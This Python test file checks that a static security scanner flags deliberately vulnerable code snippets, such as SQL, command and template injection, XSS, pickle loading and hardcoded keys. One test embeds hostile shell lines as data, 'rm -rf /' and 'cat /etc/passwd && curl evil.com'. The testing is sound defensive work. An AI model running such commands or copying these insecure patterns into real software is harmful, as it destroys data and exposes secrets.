"""Negative test cases for security scenarios."""

import pytest
from coderabbit_ai.models import SecurityFinding
from coderabbit_ai.analyzers.astgrep_scanner import AstGrepScanner


class TestSecurityNegativeScenarios:
    """Test security scenarios with malicious inputs."""

    def test_path_traversal_in_filename(self):
        """Test scanner handles path traversal in filename."""
        scanner = AstGrepScanner()

        # Attempt path traversal
        malicious_filename = "../../../etc/passwd"
        results = scanner.scan_files([
            {'path': malicious_filename, 'content': 'code'}
        ])

        # Should handle gracefully
        assert isinstance(results, list)
        # Should not process file with path traversal
        assert all(not '../../../' in f.file for f in results if hasattr(f, 'file'))

    def test_command_injection_in_content(self):
        """Test scanner detects command injection patterns."""
        scanner = AstGrepScanner()

        # Command injection patterns
        malicious_content = '''
def process_user_input(user_input):
    os.system("ls " + user_input)
    subprocess.call("cat /etc/passwd", shell=True)
'''

        results = scanner.scan_files([
            {'path': 'src/api.py', 'content': malicious_content}
        ])

        # Should detect command injection
        assert isinstance(results, list)
        assert any('command' in str(f.rule_id).lower() or 'injection' in str(f.rule_id).lower() for f in results)

    def test_sql_injection_in_content(self):
        """Test scanner detects SQL injection patterns."""
        scanner = AstGrepScanner()

        # SQL injection patterns
        malicious_content = '''
def authenticate(username, password):
    query = "SELECT * FROM users WHERE username = '" + username + "'"
    query += " AND password = '" + password + "'"
    return db.execute(query)
'''

        results = scanner.scan_files([
            {'path': 'src/api.py', 'content': malicious_content}
        ])

        # Should detect SQL injection
        assert isinstance(results, list)
        assert any('sql' in str(f.rule_id).lower() or 'injection' in str(f.rule_id).lower() for f in results)

    def test_xss_in_content(self):
        """Test scanner detects XSS patterns."""
        scanner = AstGrepScanner()

        # XSS patterns
        malicious_content = '''
def render_user_input(user_input):
    return f"<div>{user_input}</div>"
    html = "<script>" + user_input + "</script>"
'''

        results = scanner.scan_files([
            {'path': 'src/api.py', 'content': malicious_content}
        ])

        # Should detect XSS
        assert isinstance(results, list)
        assert any('xss' in str(f.rule_id).lower() or 'cross-site' in str(f.rule_id).lower() for f in results)

    def test_hardcoded_secrets_in_content(self):
        """Test scanner detects hardcoded secrets."""
        scanner = AstGrepScanner()

        # Hardcoded secrets
        malicious_content = '''
API_KEY = "sk_live_1234567890abcdef"
DATABASE_PASSWORD = "secret123"
aws_secret_key = "AKIAIOSFODNN7EXAMPLE"
'''

        results = scanner.scan_files([
            {'path': 'src/config.py', 'content': malicious_content}
        ])

        # Should detect hardcoded secrets
        assert isinstance(results, list)
        assert any('secret' in str(f.rule_id).lower() or 'key' in str(f.rule_id).lower() for f in results)

    def test_unsafe_deserialization(self):
        """Test scanner detects unsafe deserialization."""
        scanner = AstGrepScanner()

        # Unsafe deserialization
        malicious_content = '''
import pickle
def load_data(data):
    return pickle.loads(data)  # Unsafe
'''

        results = scanner.scan_files([
            {'path': 'src/loader.py', 'content': malicious_content}
        ])

        # Should detect unsafe deserialization
        assert isinstance(results, list)
        assert any('deserialization' in str(f.rule_id).lower() or 'pickle' in str(f.rule_id).lower() for f in results)

    def test_insecure_random(self):
        """Test scanner detects insecure random number generation."""
        scanner = AstGrepScanner()

        # Insecure random
        insecure_content = '''
import random
def generate_token():
    return random.random()  # Not cryptographically secure
'''

        results = scanner.scan_files([
            {'path': 'src/auth.py', 'content': insecure_content}
        ])

        # Should detect insecure random
        assert isinstance(results, list)
        # May or may not detect depending on rules

    def test_weak_hashing(self):
        """Test scanner detects weak hashing algorithms."""
        scanner = AstGrepScanner()

        # Weak hashing
        weak_content = '''
import hashlib
def hash_password(password):
    return hashlib.md5(password).hexdigest()  # Weak
'''

        results = scanner.scan_files([
            {'path': 'src/auth.py', 'content': weak_content}
        ])

        # Should detect weak hashing
        assert isinstance(results, list)
        assert any('md5' in str(f.rule_id).lower() or 'weak' in str(f.rule_id).lower() for f in results)

    def test_sensitive_data_logging(self):
        """Test scanner detects logging of sensitive data."""
        scanner = AstGrepScanner()

        # Sensitive data logging
        malicious_content = '''
def process_payment(card_number, cvv):
    logger.info(f"Processing payment: {card_number}, {cvv}")
    print("CVV:", cvv)
'''

        results = scanner.scan_files([
            {'path': 'src/payment.py', 'content': malicious_content}
        ])

        # Should detect sensitive data logging
        assert isinstance(results, list)
        assert any('logging' in str(f.rule_id).lower() or 'sensitive' in str(f.rule_id).lower() for f in results)

    def test_open_redirect(self):
        """Test scanner detects open redirect vulnerabilities."""
        scanner = AstGrepScanner()

        # Open redirect
        malicious_content = '''
def redirect_user(url):
    return redirect(url)  # No validation
'''

        results = scanner.scan_files([
            {'path': 'src/api.py', 'content': malicious_content}
        ])

        # Should detect open redirect
        assert isinstance(results, list)
        assert any('redirect' in str(f.rule_id).lower() or 'open' in str(f.rule_id).lower() for f in results)

    def test_malformed_file_content(self):
        """Test scanner handles malformed file content."""
        scanner = AstGrepScanner()

        # Malformed content
        malformed_content = '''
def broken_function(
    # Missing closing parenthesis and indentation issues
    if True
        print("hello"
    return
'''

        # Should handle gracefully
        results = scanner.scan_files([
            {'path': 'src/broken.py', 'content': malformed_content}
        ])

        assert isinstance(results, list)
        # Should not crash

    def test_unicode_injection(self):
        """Test scanner handles Unicode injection attempts."""
        scanner = AstGrepScanner()

        # Unicode injection
        malicious_content = '''
def process_user_input(user_input):
    # Unicode homograph attack
    if user_input == "admin\u00ad":
        return True
'''

        results = scanner.scan_files([
            {'path': 'src/api.py', 'content': malicious_content}
        ])

        # Should handle gracefully
        assert isinstance(results, list)

    def test_oversized_payload(self):
        """Test scanner handles oversized payloads."""
        scanner = AstGrepScanner()

        # Oversized content
        oversized_content = "def test(): pass\n" * 100000  # ~3MB

        # Should handle gracefully
        results = scanner.scan_files([
            {'path': 'src/large.py', 'content': oversized_content}
        ])

        assert isinstance(results, list)
        # Should not crash or take too long

    def test_empty_file_content(self):
        """Test scanner handles empty file content."""
        scanner = AstGrepScanner()

        results = scanner.scan_files([
            {'path': 'src/empty.py', 'content': ''}
        ])

        # Should handle empty content
        assert isinstance(results, list)
        assert len(results) >= 0  # May or may not have findings

    def test_null_bytes_in_content(self):
        """Test scanner handles null bytes in content."""
        scanner = AstGrepScanner()

        # Content with null bytes
        malicious_content = 'def test():\x00    pass'

        results = scanner.scan_files([
            {'path': 'src/malicious.py', 'content': malicious_content}
        ])

        # Should handle gracefully
        assert isinstance(results, list)

    def test_control_characters_in_content(self):
        """Test scanner handles control characters."""
        scanner = AstGrepScanner()

        # Control characters
        malicious_content = 'def test():\n\r\t\v\b\f    pass'

        results = scanner.scan_files([
            {'path': 'src/control.py', 'content': malicious_content}
        ])

        # Should handle gracefully
        assert isinstance(results, list)

    def test_shell_metacharacters(self):
        """Test scanner detects shell metacharacters in code."""
        scanner = AstGrepScanner()

        # Shell metacharacters
        malicious_content = '''
def execute_command(cmd):
    os.system(cmd + "; rm -rf /")  # Command injection
    os.popen("cat /etc/passwd && curl evil.com")
    subprocess.call("ls; cat /etc/passwd", shell=True)
'''

        results = scanner.scan_files([
            {'path': 'src/api.py', 'content': malicious_content}
        ])

        # Should detect shell metacharacters
        assert isinstance(results, list)
        assert any('injection' in str(f.rule_id).lower() or 'command' in str(f.rule_id).lower() for f in results)

    def test_eval_injection(self):
        """Test scanner detects eval injection patterns."""
        scanner = AstGrepScanner()

        # eval injection
        malicious_content = '''
def execute_code(user_code):
    eval(user_code)  # Dangerous
    exec(user_code)  # Also dangerous
'''

        results = scanner.scan_files([
            {'path': 'src/api.py', 'content': malicious_content}
        ])

        # Should detect eval injection
        assert isinstance(results, list)
        assert any('eval' in str(f.rule_id).lower() or 'execution' in str(f.rule_id).lower() for f in results)

    def test_template_injection(self):
        """Test scanner detects template injection patterns."""
        scanner = AstGrepScanner()

        # Template injection
        malicious_content = '''
def render_template(template_name, context):
    from jinja2 import Template
    template = Template(f"templates/{template_name}")
    return template.render(context)  # If template_name is user-controlled
'''

        results = scanner.scan_files([
            {'path': 'src/api.py', 'content': malicious_content}
        ])

        # Should detect template injection
        assert isinstance(results, list)
        # May detect depending on rules

    def test_ssrf_detection(self):
        """Test scanner detects server-side request forgery."""
        scanner = AstGrepScanner()

        # SSRF
        malicious_content = '''
def fetch_url(url):
    import requests
    return requests.get(url)  # No URL validation
'''

        results = scanner.scan_files([
            {'path': 'src/api.py', 'content': malicious_content}
        ])

        # Should detect SSRF
        assert isinstance(results, list)
        # May detect depending on rules
